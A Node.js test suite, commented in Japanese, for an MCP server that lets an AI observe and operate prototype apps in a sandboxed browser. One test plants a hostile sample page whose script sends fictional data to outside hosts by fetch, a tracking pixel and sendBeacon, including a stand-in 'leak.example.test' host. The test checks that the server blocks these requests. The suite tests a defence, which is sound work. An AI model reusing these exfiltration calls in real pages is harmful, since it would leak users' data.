import assert from 'node:assert/strict';
import { execFileSync, spawn } from 'node:child_process';
import fs from 'node:fs/promises';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';
import { STUDIO_ROOT } from '../../src/server/config.js';
import { ensureSampleProjects, projectPaths } from '../../src/server/projects.js';

// 観察の道具の MCP サーバー(npm run observe:mcp -- <プロジェクト>、docs/design/harness.md の 3.1、S4、S5)。
// 子プロセスで起動し、stdio の JSON-RPC で道具を呼ぶ。作る AI が使う形と同じ。
// 本物の観察器(Playwright の Chromium)を使う。プロダクト内 AI はモックで、モデルは呼ばない
const SERVER = path.join(STUDIO_ROOT, 'bin', 'observe-mcp.js');
const FIXTURES = path.join(STUDIO_ROOT, 'test', 'fixtures', 'observe');
const JOB = 'sample-job-consult';
const REQUEST_TIMEOUT_MS = 60_000;
const EXIT_TIMEOUT_MS = 30_000;
const TEST_TIMEOUT_MS = 180_000;
const GREETING = 'こんにちは。しおかぜ求人相談の案内役です';
const TYPED = 'しおかぜ町でカフェのアルバイトを探しています';
const PNG_SIGNATURE = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);

let home;
let tmp;

// MCP の相手(作る AI の代わり)。1 行に 1 つのメッセージを書き、id ごとに答えを待つ
function startServer(project, args = []) {
  const child = spawn(process.execPath, [SERVER, project, ...args], {
    env: { PATH: process.env.PATH, HOME: process.env.HOME, STUDIO_HOME: home, TMPDIR: tmp },
    stdio: ['pipe', 'pipe', 'pipe'],
  });
  const waiting = new Map();
  const others = [];
  let stderr = '';
  let buffer = '';
  let nextId = 0;
  child.stderr.on('data', (chunk) => {
    stderr += chunk;
  });
  // サーバーが先に終わった後に書くと EPIPE になる。答えが来ないことは、各テストが待ちの上限で確かめる
  child.stdin.on('error', () => {});
  child.stdout.on('data', (chunk) => {
    buffer += chunk;
    let index;
    while ((index = buffer.indexOf('\n')) >= 0) {
      const message = JSON.parse(buffer.slice(0, index));
      buffer = buffer.slice(index + 1);
      if (waiting.has(message.id)) waiting.get(message.id)(message);
      else others.push(message);
    }
  });
  const exited = new Promise((resolve) => child.once('exit', (code, signal) => resolve({ code, signal })));

  const rpc = (method, params) => {
    nextId += 1;
    const id = nextId;
    return new Promise((resolve, reject) => {
      const timer = setTimeout(() => {
        waiting.delete(id);
        reject(new Error(`${method} の答えが ${REQUEST_TIMEOUT_MS / 1000} 秒で来ません。stderr: ${stderr}`));
      }, REQUEST_TIMEOUT_MS);
      // 中断のテストでは答えが来ないので、この待ちでテストの終わりを延ばさない
      timer.unref();
      waiting.set(id, (message) => {
        clearTimeout(timer);
        waiting.delete(id);
        resolve(message);
      });
      child.stdin.write(`${JSON.stringify({ jsonrpc: '2.0', id, method, ...(params ? { params } : {}) })}\n`);
    });
  };

  // 道具を呼び、文の結果(JSON)と画像を分けて返す
  const call = async (name, args = {}) => {
    const response = await rpc('tools/call', { name, arguments: args });
    assert.equal(response.error, undefined, JSON.stringify(response.error));
    const { content, isError = false } = response.result;
    const text = content.find((item) => item.type === 'text')?.text ?? '';
    let data = null;
    try {
      data = JSON.parse(text);
    } catch {
      // 誤りは文で返る
    }
    return { isError, text, data, images: content.filter((item) => item.type === 'image') };
  };

  // 入力を閉じて、終わるのを待つ。時間内に終わらなければ止める(失敗として扱う)
  const stop = async () => {
    child.stdin.end();
    let timer;
    const result = await Promise.race([
      exited,
      new Promise((resolve) => {
        timer = setTimeout(() => resolve(null), EXIT_TIMEOUT_MS);
      }),
    ]);
    clearTimeout(timer);
    if (result === null) {
      child.kill('SIGKILL');
      await exited;
      throw new Error(`MCP サーバーが ${EXIT_TIMEOUT_MS / 1000} 秒で終わりません。stderr: ${stderr}`);
    }
    return result;
  };

  const initialize = () => rpc('initialize', { protocolVersion: '2025-06-18', capabilities: {}, clientInfo: { name: 'observe-mcp-test', version: '1' } });
  return { child, rpc, call, stop, exited, initialize, others, stderr: () => stderr };
}

// フォルダーの中のファイルと、その中身と時刻(指紋。変わっていないかを比べる)
async function fingerprint(dir) {
  const files = {};
  for (const name of (await fs.readdir(dir, { recursive: true })).sort()) {
    const file = path.join(dir, name);
    const stat = await fs.lstat(file);
    files[name] = stat.isFile() ? { mtimeMs: stat.mtimeMs, body: (await fs.readFile(file)).toString('base64') } : { kind: stat.isDirectory() ? 'dir' : 'other' };
  }
  return files;
}

// サーバーは TMPDIR(tmp)の下に、起動ごとの一時フォルダー(prototype-studio-observe-mcp-<pid>-…)を 1 つ作る。
// 作業中のビルドも、Playwright のプロフィールなども、その中にできる(src/server/observe-temp.js)
const SERVER_TEMP = /^prototype-studio-observe-mcp-\d+-[A-Za-z0-9]{6}$/;
const leftovers = async () => (await fs.readdir(tmp)).filter((name) => name.startsWith('prototype-studio-observe-'));
const buildTemps = async () => {
  const builds = [];
  for (const name of await leftovers()) {
    if (!SERVER_TEMP.test(name)) continue;
    for (const inner of await fs.readdir(path.join(tmp, name))) if (inner.startsWith('prototype-studio-observe-')) builds.push(inner);
  }
  return builds;
};

// tmp の下を使っているプロセス(Chromium は --user-data-dir に tmp の下のプロフィールを持つ)
function browserProcesses() {
  const lines = execFileSync('ps', ['-axo', 'pid=,command='], { encoding: 'utf8' }).split('\n');
  return lines.filter((line) => line.includes(tmp) && !/\bps -axo\b/.test(line)).map((line) => line.trim());
}

// ブラウザのプロセスが終わるのを待つ(親が強制終了されたブラウザは、パイプが閉じて少し後に終わる)
async function waitBrowsersGone(ms = 10_000) {
  const until = Date.now() + ms;
  while (browserProcesses().length > 0 && Date.now() < until) await new Promise((resolve) => setTimeout(resolve, 200));
  return browserProcesses();
}

function assertPng(image) {
  assert.equal(image.mimeType, 'image/png');
  const bytes = Buffer.from(image.data, 'base64');
  assert.ok(bytes.length > 1000);
  assert.deepEqual(bytes.subarray(0, 8), PNG_SIGNATURE);
}

async function writeProject(name, files) {
  const root = path.join(home, 'elsewhere', name);
  const app = path.join(root, 'app');
  await fs.rm(app, { recursive: true, force: true });
  await fs.mkdir(app, { recursive: true });
  for (const [file, source] of Object.entries(files)) await fs.writeFile(path.join(app, file), source);
  return root;
}

test.before(async () => {
  home = await fs.mkdtemp(path.join(os.tmpdir(), 'studio-observe-mcp-'));
  tmp = path.join(home, 'tmp');
  await fs.mkdir(tmp);
  await ensureSampleProjects(home, path.join(STUDIO_ROOT, 'samples'));
});

test.after(async () => {
  if (home) await fs.rm(home, { recursive: true, force: true });
});

test('stdio で道具を順に呼ぶと、見本の求人相談で入力した文字と AI のあいさつが読め、画像が返る。app/ は変わらない', { timeout: TEST_TIMEOUT_MS }, async () => {
  const paths = projectPaths(home, JOB);
  const before = await fingerprint(paths.app);
  const server = startServer(JOB);
  try {
    const init = await server.initialize();
    assert.deepEqual(init.result.capabilities, { tools: { listChanged: false } });
    const listed = await server.rpc('tools/list');
    assert.deepEqual(
      listed.result.tools.map((tool) => tool.name),
      ['open', 'read_page', 'inspect', 'click', 'type', 'scroll', 'set_viewport', 'screenshot', 'run_scenarios'],
    );

    // open: 作業中の app/ を一時にビルドして開き、読み込み、エラー、最初のスクリーンショットを返す
    const opened = await server.call('open', { viewport: 'desktop' });
    assert.equal(opened.isError, false, opened.text);
    assert.equal(opened.data.opened, true);
    assert.equal(opened.data.load, 'done');
    assert.deepEqual(opened.data.errors, []);
    assert.equal(opened.images.length, 1);
    assertPng(opened.images[0]);
    // スクリーンショットは .studio/observations/<obs-id>/ に置く(app/ の外)
    const sessionDir = path.dirname(opened.data.screenshot);
    assert.equal(path.dirname(sessionDir), path.join(paths.studio, 'observations'));
    // 一時のビルドは、開いている間だけ、サーバーの一時フォルダーの中にある
    assert.equal((await leftovers()).length, 1);
    assert.equal((await buildTemps()).length, 1);

    const greeted = await server.call('read_page');
    assert.equal(greeted.isError, false, greeted.text);
    assert.match(greeted.data.text, new RegExp(GREETING));

    // 同じ文脈で操作を続ける
    const typed = await server.call('type', { target: { label: 'メッセージ' }, text: TYPED });
    assert.equal(typed.isError, false, typed.text);
    const clicked = await server.call('click', { target: { role: 'button', name: '送る' } });
    assert.equal(clicked.isError, false, clicked.text);
    assert.deepEqual(clicked.data.newErrors, []);
    // 見本は AI の返事が来てから発言を出すので、出るまで読み直す(5 秒まで)
    let read;
    for (let tries = 0; tries < 25; tries += 1) {
      read = await server.call('read_page');
      if (read.data.text.includes(TYPED)) break;
      await new Promise((resolve) => setTimeout(resolve, 200));
    }
    assert.match(read.data.text, new RegExp(GREETING));
    assert.match(read.data.text, new RegExp(TYPED));
    assert.match(read.data.tree, /region "希望条件"/);

    const shot = await server.call('screenshot', { name: '話した後' });
    assert.equal(shot.isError, false, shot.text);
    assert.equal(shot.images.length, 1);
    assertPng(shot.images[0]);
    assert.equal(path.dirname(shot.data.file), sessionDir);

    // 残りの道具も呼ぶ(app/ の指紋が変わらないことを、すべての道具で確かめる)
    const inspected = await server.call('inspect');
    assert.ok(inspected.data.elements.some((element) => element.role === 'textbox' && element.name === 'メッセージ'));
    const one = await server.call('inspect', { target: { region: '希望条件' } });
    assert.equal(one.data.count, 1);
    assert.equal((await server.call('scroll', { to: 'bottom' })).isError, false);
    assert.equal((await server.call('scroll', { target: { text: '喫茶こもれび' } })).isError, false);
    const resized = await server.call('set_viewport', { viewport: 'mobile' });
    assert.deepEqual([resized.data.width, resized.data.height], [390, 844]);
    const missing = await server.call('click', { target: { role: 'button', name: '架空の存在しないボタン' } });
    assert.equal(missing.isError, true);
    assert.match(missing.text, /対象が見つかりません/);

    // run_scenarios: 基本のシナリオと app/scenarios/ を、関門と同じ形で回す
    const ran = await server.call('run_scenarios');
    assert.equal(ran.isError, false, ran.text);
    assert.equal(ran.data.verdict, 'passed');
    assert.deepEqual(
      ran.data.scenarios.map((scenario) => [scenario.name, scenario.verdict]),
      [
        ['起動して描画が空でなく、エラーがない', 'passed'],
        ['プロダクト内 AI のあいさつが出る', 'passed'],
        ['希望を話すと、希望条件が埋まり、合う求人が絞られる', 'passed'],
      ],
    );
    const scenarioReport = JSON.parse(await fs.readFile(ran.data.report, 'utf8'));
    assert.equal(scenarioReport.format, 'prototype-studio-observation');
    assert.equal(path.dirname(path.dirname(ran.data.report)), path.join(paths.studio, 'observations'));

    // run_scenarios の後も、open で開いた文脈で続けられる
    const still = await server.call('read_page');
    assert.equal(still.data.viewport, 'mobile');
    assert.match(still.data.text, new RegExp(TYPED));
  } finally {
    const exit = await server.stop();
    assert.equal(exit.code, 0, server.stderr());
  }

  // 終わると、開いていた観察の report を書き、ブラウザと一時フォルダーを片付ける
  assert.deepEqual(await leftovers(), []);
  const observations = await fs.readdir(path.join(paths.studio, 'observations'));
  assert.equal(observations.length, 2);
  for (const id of observations) {
    const report = JSON.parse(await fs.readFile(path.join(paths.studio, 'observations', id, 'report.json'), 'utf8'));
    assert.equal(report.format, 'prototype-studio-observation');
    assert.equal(report.verdict, 'passed');
    // プロダクト内 AI はモックの観察用の会話で答えた
    assert.ok(report.ai.length > 0);
    for (const entry of report.ai) assert.deepEqual([entry.connection.kind, entry.connection.real], ['mock', false]);
  }
  // 道具を全部呼んでも、app/ の中身は変わらない
  assert.deepEqual(await fingerprint(paths.app), before);
});

test('壊した見本で open を呼ぶと、ビルドの失敗と実行時のエラーが文で返り、直して開き直すと通る', { timeout: TEST_TIMEOUT_MS }, async () => {
  const root = await writeProject('broken', { 'main.jsx': await fs.readFile(path.join(FIXTURES, 'build-error', 'main.jsx'), 'utf8') });
  const server = startServer(root);
  try {
    await server.initialize();
    const unbuilt = await server.call('open');
    assert.equal(unbuilt.data.opened, false, unbuilt.text);
    assert.equal(unbuilt.data.verdict, 'failed');
    assert.equal(unbuilt.data.errors[0].kind, 'build');
    assert.equal(unbuilt.data.errors[0].file, 'app/main.jsx');
    assert.match(unbuilt.data.errors[0].message, /\S/);
    assert.equal(unbuilt.images.length, 0);
    // 開けなかったので、操作の道具は使えない
    assert.match((await server.call('read_page')).text, /先に open を呼んでください/);

    // 作る AI が app/ を直した(描画の途中で投げる)。もう一度 open を呼ぶ
    await fs.writeFile(path.join(root, 'app', 'main.jsx'), await fs.readFile(path.join(FIXTURES, 'render-error', 'main.jsx'), 'utf8'));
    const thrown = await server.call('open');
    assert.equal(thrown.isError, false, thrown.text);
    const runtime = thrown.data.errors.find((error) => error.kind === 'runtime');
    assert.ok(runtime, thrown.text);
    assert.match(runtime.message, /架空の在庫表が読めません/);
    // シナリオを回すと、失敗した手順と、そのときの画面が返る
    const ran = await server.call('run_scenarios');
    assert.equal(ran.data.verdict, 'failed', ran.text);
    const failed = ran.data.scenarios.find((scenario) => scenario.verdict === 'failed');
    assert.ok(failed?.failed.message, ran.text);
    assert.equal(ran.images.length, 1);
    assertPng(ran.images[0]);

    await fs.cp(path.join(FIXTURES, 'ok'), path.join(root, 'app'), { recursive: true });
    const fixed = await server.call('open');
    assert.equal(fixed.data.opened, true, fixed.text);
    assert.deepEqual(fixed.data.errors, []);
    assert.equal(fixed.images.length, 1);
  } finally {
    const exit = await server.stop();
    assert.equal(exit.code, 0, server.stderr());
  }
  assert.deepEqual(await leftovers(), []);
});

test('悪意のある見本を道具で開いて操作しても、外への要求は断たれ、断った要求が文で返る', { timeout: TEST_TIMEOUT_MS }, async (t) => {
  // Studio とプレビュー以外の受け手。何か届けば数える
  const received = [];
  const sink = http.createServer((req, res) => {
    received.push(req.url);
    res.end('received');
  });
  await new Promise((resolve) => sink.listen(0, '127.0.0.1', resolve));
  t.after(() => new Promise((resolve) => sink.close(resolve)));
  const sinkOrigin = `http://127.0.0.1:${sink.address().port}`;
  const source = `
const root = document.getElementById('root');
const send = (where) => fetch(${JSON.stringify(sinkOrigin)} + '/' + where + '?data=fictional-stock').catch(() => {});
send('on-load');
fetch('http://leak.example.test/on-load').catch(() => {});
const image = new Image();
image.src = ${JSON.stringify(`${sinkOrigin}/pixel.png`)};
root.append(image);
const button = document.createElement('button');
button.textContent = '架空の在庫を送る';
button.onclick = () => {
  send('on-click');
  navigator.sendBeacon(${JSON.stringify(`${sinkOrigin}/beacon`)}, 'fictional');
};
root.append(button);
`;
  const root = await writeProject('probe', { 'main.js': source });
  const before = await fingerprint(path.join(root, 'app'));
  const server = startServer(root);
  try {
    await server.initialize();
    const opened = await server.call('open');
    assert.equal(opened.data.opened, true, opened.text);
    const clicked = await server.call('click', { target: { role: 'button', name: '架空の在庫を送る' } });
    assert.equal(clicked.isError, false, clicked.text);
    await new Promise((resolve) => setTimeout(resolve, 500));
    const read = await server.call('read_page');
    const errors = [...opened.data.errors, ...clicked.data.newErrors, ...read.data.newErrors];
    const blocked = errors.filter((error) => error.kind === 'blocked-request');
    assert.ok(blocked.length > 0, JSON.stringify(errors));
    for (const error of blocked) assert.match(error.message, /断ちました/);
  } finally {
    const exit = await server.stop();
    assert.equal(exit.code, 0, server.stderr());
  }
  assert.deepEqual(received, []);
  assert.deepEqual(await fingerprint(path.join(root, 'app')), before);
});

// 開いている途中で止まっても、一時フォルダー(Playwright のものも)、ブラウザのプロセス、report のない観察のフォルダーは残さない
async function assertCleanedUp(server, exit) {
  if (exit === null) {
    server.child.kill('SIGKILL');
    await server.exited;
    assert.fail(`MCP サーバーが終わりません。stderr: ${server.stderr()}`);
  }
  assert.deepEqual(await waitBrowsersGone(), [], server.stderr());
  assert.deepEqual(await fs.readdir(tmp), [], server.stderr());
  const dir = path.join(projectPaths(home, JOB).studio, 'observations');
  for (const id of await fs.readdir(dir)) await fs.access(path.join(dir, id, 'report.json'));
}

const exitWithin = (server) => {
  let timer;
  return Promise.race([
    server.exited,
    new Promise((resolve) => {
      timer = setTimeout(() => resolve(null), EXIT_TIMEOUT_MS);
    }),
  ]).finally(() => clearTimeout(timer));
};

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// open を呼び、waitMs 後に中断する。待ちの長さで、ビルド、ブラウザの起動、読み込み、開いた後のどこかに当たる
async function interruptOpen(waitMs, interrupt, args = []) {
  const server = startServer(JOB, args);
  await server.initialize();
  server.call('open').catch(() => {});
  await sleep(waitMs);
  interrupt?.(server);
  const exit = await exitWithin(server);
  await assertCleanedUp(server, exit);
  return { server, exit };
}

const WAITS_MS = [300, 900, 1_500, 3_000];

test('相手(作る AI)が open の途中で消えても、MCP サーバーは片付けて終わる', { timeout: TEST_TIMEOUT_MS }, async () => {
  for (const waitMs of WAITS_MS) {
    // 相手のプロセスが終わると、両方のパイプが閉じる
    const { server, exit } = await interruptOpen(waitMs, (running) => {
      running.child.stdout.destroy();
      running.child.stdin.end();
    });
    // 書けなかった答え(EPIPE)で落ちずに、入力が閉じたときと同じに終わる
    assert.equal(exit.code, 0, server.stderr());
  }
});

test('open の途中で SIGINT を受けても、一時フォルダーとブラウザを残さずに終わる', { timeout: TEST_TIMEOUT_MS }, async () => {
  for (const waitMs of WAITS_MS) {
    const { server, exit } = await interruptOpen(waitMs, (running) => running.child.kill('SIGINT'));
    assert.equal(exit.code, 130, server.stderr());
  }
});

test('open の途中で SIGTERM を受けても、一時フォルダーとブラウザを残さずに終わる', { timeout: TEST_TIMEOUT_MS }, async () => {
  for (const waitMs of WAITS_MS) {
    const { server, exit } = await interruptOpen(waitMs, (running) => running.child.kill('SIGTERM'));
    assert.equal(exit.code, 130, server.stderr());
  }
});

test('サーバーの全体の時間の上限を超えると、open の途中でも、ブラウザと一時フォルダーを片付けて終わる', { timeout: TEST_TIMEOUT_MS }, async () => {
  // 上限の後も、入力は開いたまま
  for (const seconds of ['0.3', '0.9', '1.5', '3']) {
    const { server, exit } = await interruptOpen(0, null, ['--max-seconds', seconds]);
    assert.equal(exit.code, 0, server.stderr());
    assert.match(server.stderr(), /時間の上限/);
  }
});

test('片付けの途中で強制終了されて残った一時フォルダーは、次の起動で消す。自分のものでないものは消さない', { timeout: TEST_TIMEOUT_MS }, async () => {
  // 自分のものでないもの: 動いているプロセス(このテスト)の名前、CLI の作業中のビルド、ほかのプログラムのもの
  const foreign = [`prototype-studio-observe-mcp-${process.pid}-AbC123`, 'prototype-studio-observe-AbC123', 'playwright_chromiumdev_profile-AbC123', 'other-tool-AbC123'];
  for (const name of foreign) {
    await fs.mkdir(path.join(tmp, name));
    await fs.writeFile(path.join(tmp, name, 'keep.txt'), 'fictional');
  }
  try {
    const killed = startServer(JOB);
    await killed.initialize();
    killed.call('open').catch(() => {});
    // ブラウザの起動と読み込みの途中で、片付けを待たずに止める(ADR-0001 の止め方の最後の SIGKILL)
    await sleep(700);
    killed.child.kill('SIGKILL');
    await killed.exited;
    // ブラウザはパイプが閉じて終わる。一時フォルダーは残る
    assert.deepEqual(await waitBrowsersGone(), []);
    const stale = (await fs.readdir(tmp)).filter((name) => SERVER_TEMP.test(name) && name.includes(`-${killed.child.pid}-`));
    assert.equal(stale.length, 1, JSON.stringify(await fs.readdir(tmp)));

    // 次の起動は、答える前に古い一時フォルダーを消す
    const next = startServer(JOB);
    try {
      await next.initialize();
      const names = await fs.readdir(tmp);
      assert.equal(names.includes(stale[0]), false, JSON.stringify(names));
      assert.deepEqual(names.filter((name) => SERVER_TEMP.test(name) && name.includes(`-${next.child.pid}-`)).length, 1);
      for (const name of foreign) assert.equal(await fs.readFile(path.join(tmp, name, 'keep.txt'), 'utf8'), 'fictional');
    } finally {
      const exit = await next.stop();
      assert.equal(exit.code, 0, next.stderr());
    }
    assert.deepEqual((await fs.readdir(tmp)).sort(), [...foreign].sort());
  } finally {
    for (const name of foreign) await fs.rm(path.join(tmp, name), { recursive: true, force: true });
  }
});

test('起動の引数でプロジェクトが見つからないときは、起動せずに 3 で終わる', { timeout: TEST_TIMEOUT_MS }, async () => {
  const server = startServer('no-such-project');
  const exit = await server.exited;
  assert.equal(exit.code, 3);
  assert.match(server.stderr(), /プロジェクトが見つかりません: no-such-project/);
});
